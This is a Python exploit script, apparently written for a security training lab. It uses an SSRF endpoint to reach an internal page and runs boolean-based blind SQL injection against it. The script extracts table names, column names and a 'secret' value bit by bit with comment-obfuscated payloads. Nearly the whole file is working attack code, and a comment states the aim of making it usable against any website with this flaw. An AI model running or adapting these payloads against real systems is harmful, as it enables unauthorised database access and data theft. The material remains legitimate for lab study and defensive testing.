import requests
import urllib.parse
from bs4 import BeautifulSoup
import base64
import sys

#I will try to make this tool usable for any website that has a boolean-based SQLi vulnerability

PREFIX_URL = ''
BASE_URL = 'http://ssrf.cyberjutsu-lab.tech:9001/feature.php?url={target}'
wrong_indicator = 'Post not found'
tables_amount = 0
tables_length = []
tables_name = []
tables_columns_amount = []
tables_columns_length = []
tables_columns_name = []
data_length = 0
data = ''

# Figure out the amount of tables in the database
for i in range(1,11):
    PREFIX_URL = f'http://localhost:8888/post.php?id=1/**/AND/**/(CASE/**/WHEN/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=DATABASE())={i}/**/THEN/**/1/**/ELSE/**/0/**/END)#'
    TARGET_URL = urllib.parse.quote(PREFIX_URL)
    URL = BASE_URL.format(target=TARGET_URL)
    r = requests.get(URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    img_tags = soup.find_all('img')
    src = img_tags[0]['src']
    encoded = src.split(', ', 1)[1]
    decoded = base64.b64decode(encoded)
    if (isinstance(decoded, bytes)):
        decoded = decoded.decode('utf-8')
    if (wrong_indicator not in decoded):
        print(f"There are {i} tables in the database")
        tables_amount = i # The amount of tables

#Fogure out the length of tables' names
for i in range (0, 2):
    for j in range (0, 200):
        PREFIX_URL = f'http://localhost:8888/post.php?id=1/**/AND/**/(CASE/**/WHEN/**/(SELECT/**/LENGTH(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=DATABASE()/**/LIMIT/**/1/**/OFFSET/**/{i})={j}/**/THEN/**/1/**/ELSE/**/0/**/END)#'
        TARGET_URL = urllib.parse.quote(PREFIX_URL)
        URL = BASE_URL.format(target=TARGET_URL)
        r = requests.get(URL)
        soup = BeautifulSoup(r.text, 'html.parser')
        img_tags = soup.find_all('img')
        src = img_tags[0]['src']
        encoded = src.split(', ', 1)[1]
        decoded = base64.b64decode(encoded)
        if (isinstance(decoded, bytes)):
            decoded = decoded.decode('utf-8')
        if (wrong_indicator not in decoded):
            print(f"Table {i}th has {j} letters in its name")
            tables_length.append(j)
            break

# Figure out the names of the tables using brute-force (finding way to bitmask the name atm)     
# for i in range(len(tables_length)):
#     name = '' 
#     for j in range(1, tables_length[i] + 1): 
#         found_char = None  
#         for k in range(32, 127):
#             PREFIX_URL = f'http://localhost:8888/post.php?id=1/**/AND/**/(CASE/**/WHEN/**/(ASCII(SUBSTR((SELECT/**/TABLE_NAME/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE()/**/LIMIT/**/1/**/OFFSET/**/{i}),/**/{j},/**/1)))={k}/**/THEN/**/1/**/ELSE/**/0/**/END)#'
#             TARGET_URL = urllib.parse.quote(PREFIX_URL)
#             URL = BASE_URL.format(target=TARGET_URL)
#             r = requests.get(URL)
#             soup = BeautifulSoup(r.text, 'html.parser')
#             img_tags = soup.find_all('img')
#             src = img_tags[0]['src']
#             encoded = src.split(', ', 1)[1]
#             decoded = base64.b64decode(encoded)
#             if (isinstance(decoded, bytes)):
#                 decoded = decoded.decode('utf-8')
#                 #print(decoded)
#             if ("Post not found" not in decoded):
#                 name += chr(k)
#                 break
            
#     print(name)        
    
# Figure out the names of the tables using bitshift
for i in range(len(tables_length)):
    name = '' 
    for j in range(1, tables_length[i] + 1): 
        bits = []
        lists = [128, 64, 32, 16, 8, 4, 2, 1] 
        for k in lists:
            print(f"Testing letter {j} of table {i}", end='\r')
            PREFIX_URL = f'http://localhost:8888/post.php?id=1/**/AND/**/(MOD(ASCII(SUBSTRING((SELECT/**/TABLE_NAME/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE()/**/LIMIT/**/1/**/OFFSET/**/{i}),/**/{j},/**/1))/**/DIV/**/{k},/**/2)/**/>/**/0)#'
            TARGET_URL = urllib.parse.quote(PREFIX_URL)
            URL = BASE_URL.format(target=TARGET_URL)
            r = requests.get(URL)
            soup = BeautifulSoup(r.text, 'html.parser')
            img_tags = soup.find_all('img')
            src = img_tags[0]['src']
            encoded = src.split(', ', 1)[1]
            decoded = base64.b64decode(encoded)
            if (isinstance(decoded, bytes)):
                decoded = decoded.decode('utf-8')
                #print(decoded)
            if (wrong_indicator not in decoded):
                bits.append(1)
            else:
                bits.append(0)   
        # Convert bits to ASCII
        bits = [str(x) for x in bits]
        bits = ''.join(bits)
        bits = int(bits, 2)
        #print(bits, end ='')
        name += chr(bits)      
    tables_name.append(name)

sys.stdout.write("\033[K")  # Xóa dòng hiện tại trên terminal
sys.stdout.flush()
print(f"Table names: {tables_name}")  

# Figure out the amount of columns in every tables
for table_name in tables_name:
    for i in range (0,101):
        PREFIX_URL = f"http://localhost:8888/post.php?id=1/**/AND/**/(CASE/**/WHEN/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=DATABASE()/**/AND/**/table_name='{table_name}')={i}/**/THEN/**/1/**/ELSE/**/0/**/END)#"
        TARGET_URL = urllib.parse.quote(PREFIX_URL)
        URL = BASE_URL.format(target=TARGET_URL)
        r = requests.get(URL)
        soup = BeautifulSoup(r.text, 'html.parser')
        img_tags = soup.find_all('img')
        src = img_tags[0]['src']
        encoded = src.split(', ', 1)[1]
        decoded = base64.b64decode(encoded)
        if (isinstance(decoded, bytes)):
            decoded = decoded.decode('utf-8')
            #print(f"Checking {i} for table {table_name}: {decoded}")
        if (wrong_indicator not in decoded):
            print(f"There are {i} columns in {table_name}")
            tables_columns_amount.append(i)
            break
     
# Figure out the amounts of letter of the columns in every tables
for q in range(tables_amount):
    temp_table_columns_length = []
    for i in range (tables_columns_amount[q]):
        for j in range(101):
            PREFIX_URL = f"http://localhost:8888/post.php?id=1/**/AND/**/(CASE/**/WHEN/**/(SELECT/**/LENGTH(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='{tables_name[q]}'/**/LIMIT/**/1/**/OFFSET/**/{i})={j}/**/THEN/**/1/**/ELSE/**/0/**/END)#"
            TARGET_URL = urllib.parse.quote(PREFIX_URL)
            URL = BASE_URL.format(target=TARGET_URL)
            r = requests.get(URL)
            soup = BeautifulSoup(r.text, 'html.parser')
            img_tags = soup.find_all('img')
            src = img_tags[0]['src']
            encoded = src.split(', ', 1)[1]
            decoded = base64.b64decode(encoded)
            if (isinstance(decoded, bytes)):
                decoded = decoded.decode('utf-8')
            if (wrong_indicator not in decoded):
                print(f"Table {tables_name[q]} has {j} letters in its {i}th column")
                temp_table_columns_length.append(j)
                break
    tables_columns_length.append(temp_table_columns_length)
#print(tables_columns_length) 

#Figure out the names of the columns in every table (which has 1 column)
for q in range(tables_amount):
    temp_tables_columns_name = []
    for i in range (tables_columns_amount[q]):
        name = ''
        for j in range (1, tables_columns_length[q][i] + 1):
            bits = []
            lists = [128, 64, 32, 16, 8, 4, 2, 1] 
            for k in lists:
                print(f"Testing letter {j} of column {i} of table {tables_name[q]}", end='\r')
                PREFIX_URL= f"http://localhost:8888/post.php?id=1/**/AND/**/(MOD(ASCII(SUBSTRING((SELECT/**/COLUMN_NAME/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME='{tables_name[q]}'/**/LIMIT/**/1/**/OFFSET/**/{i}),/**/{j},/**/1))/**/DIV/**/{k},/**/2)/**/>/**/0)"
                TARGET_URL = urllib.parse.quote(PREFIX_URL)
                URL = BASE_URL.format(target=TARGET_URL)
                r = requests.get(URL)
                soup = BeautifulSoup(r.text, 'html.parser')
                img_tags = soup.find_all('img')
                src = img_tags[0]['src']
                encoded = src.split(', ', 1)[1]
                decoded = base64.b64decode(encoded)
                if (isinstance(decoded, bytes)):
                    decoded = decoded.decode('utf-8')
                if (wrong_indicator not in decoded):
                    bits.append(1)
                else:
                    bits.append(0)
                    # Convert bits to ASCII
            bits = [str(x) for x in bits]
            bits = ''.join(bits)
            bits = int(bits, 2)
            name += chr(bits)
        #print(name)  
        temp_tables_columns_name.append(name)
    tables_columns_name.append(temp_tables_columns_name)

sys.stdout.write("\033[K")  # Xóa dòng hiện tại trên terminal
sys.stdout.flush()
print(f"Table columns: {tables_columns_name}")

#Alright, I give up. I ain't going to get EVERY data in the database. I will just get the first row of the first table which has 1 column. This is why tools are needed.

# Figure out the length of the data in the first row of table 'Flag' in column 'secret'
for i in range(1, 101):
    PREFIX_URL = f"http://localhost:8888/post.php?id=1/**/AND/**/(CASE/**/WHEN/**/(SELECT/**/LENGTH(secret)/**/FROM/**/Flag/**/LIMIT/**/1/**/OFFSET/**/0)={i}/**/THEN/**/1/**/ELSE/**/0/**/END)#"
    TARGET_URL = urllib.parse.quote(PREFIX_URL)
    URL = BASE_URL.format(target=TARGET_URL)
    r = requests.get(URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    img_tags = soup.find_all('img')
    src = img_tags[0]['src']
    encoded = src.split(', ', 1)[1]
    decoded = base64.b64decode(encoded)
    if (isinstance(decoded, bytes)):
        decoded = decoded.decode('utf-8')
    if (wrong_indicator not in decoded):
        print(f"There are {i} letters in the data")
        data_length = i
        break
    
# Figure out the data in the first row of table 'Flag' in column 'secret'
for i in range(1, data_length + 1):
    bits = []
    lists = [128, 64, 32, 16, 8, 4, 2, 1] 
    for k in lists:
        print(f"Testing letter {i} of data", end='\r')
        PREFIX_URL= f"http://localhost:8888/post.php?id=1/**/AND/**/(MOD(ASCII(SUBSTRING((SELECT/**/secret/**/FROM/**/Flag/**/LIMIT/**/1/**/OFFSET/**/0),/**/{i},/**/1))/**/DIV/**/{k},/**/2)/**/>/**/0)"
        TARGET_URL = urllib.parse.quote(PREFIX_URL)
        URL = BASE_URL.format(target=TARGET_URL)
        r = requests.get(URL)
        soup = BeautifulSoup(r.text, 'html.parser')
        img_tags = soup.find_all('img')
        src = img_tags[0]['src']
        encoded = src.split(', ', 1)[1]
        decoded = base64.b64decode(encoded)
        if (isinstance(decoded, bytes)):
            decoded = decoded.decode('utf-8')
        if (wrong_indicator not in decoded):
            bits.append(1)
        else:
            bits.append(0)
            # Convert bits to ASCII
    bits = [str(x) for x in bits]
    bits = ''.join(bits)
    bits = int(bits, 2)
    data += chr(bits)
    
print(data)